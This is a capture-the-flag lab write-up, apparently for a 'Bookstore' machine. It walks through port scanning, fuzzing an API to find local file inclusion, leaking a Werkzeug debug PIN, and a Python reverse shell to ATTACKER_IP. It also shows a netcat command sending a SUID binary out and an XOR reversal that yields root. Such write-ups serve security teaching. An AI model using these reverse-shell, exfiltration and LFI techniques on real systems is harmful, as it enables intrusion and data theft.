# Bookstore

**Difficulty:** Medium
## Reconnaissance

Running a standard nmap scan revealed three open ports:
```bash
nmap -sC -sV -oN nmap.txt bookstore.thm -p- -T4
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Book Store
|_http-server-header: Apache/2.4.29 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-title: Home
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
| http-robots.txt: 1 disallowed entry 
|_/api </p>
```

The Werkzeug server on port 5000 looked interesting with a `/api` entry in robots.txt.

### Directory Fuzzing 
**Port 80:** 
```bash 
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://bookstore.thm/FUZZ -e .html,.php,.txt 
``` 

Found standard pages: `LICENSE.txt`, `books.html`, `index.html`, `login.html` 

**Port 5000:** 
```bash 
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://bookstore.thm:5000/FUZZ 
``` 

Key endpoints: `/api`, `/console` (Werkzeug debug console - PIN protected)
## Initial Access

The console required a PIN, so I focused on the API. Fuzzing API parameters revealed a hidden parameter:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u "http://bookstore.thm:5000/api/v1/resources/books?FUZZ=.bash_history"
```

Discovered the `show` parameter with LFI capabilities. Reading `.bash_history` exposed the Werkzeug debug PIN:
```bash
curl "http://bookstore.thm:5000/api/v1/resources/books?show=.bash_history"
```
```
export WERKZEUG_DEBUG_PIN=REDACTED
```

With the PIN, I unlocked the console and executed a Python reverse shell:
```bash
# Listener
nc -lvnp 4444

# Werkzeug Console
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

**User flag obtained:** `cat /home/sid/user.txt`

## Privilege Escalation

Found a SUID binary in sid's home directory:
```bash
-rwsrwsr-x 1 root sid 8488 Oct 20 2020 try-harder
```

The binary prompted for a "magic number" - time for some reverse engineering.

### Binary Analysis

Transferred the binary for analysis:
```bash
# Attacker
nc -lvnp 5555 > try-harder

# Target
cat try-harder | nc ATTACKER_IP 5555
```

Disassembled with GDB to find the validation logic:
```asm
mov    DWORD PTR [rbp-0x10],0x5db3
xor    eax,0x1116
xor    DWORD PTR [rbp-0xc],eax
cmp    DWORD PTR [rbp-0xc],0x5dcd21f4
```

The logic: `(input XOR 0x1116) XOR 0x5db3 == 0x5dcd21f4`

Reversed the XOR operations with Python:
```python
target = 0x5dcd21f4
xor1 = 0x1116
xor2 = 0x5db3
magic_number = target ^ xor1 ^ xor2
print(f"Magic Number: {magic_number}")
```

Running the binary with `REDACTED` spawned a root shell.

**Root flag obtained:** `cat /root/root.txt`
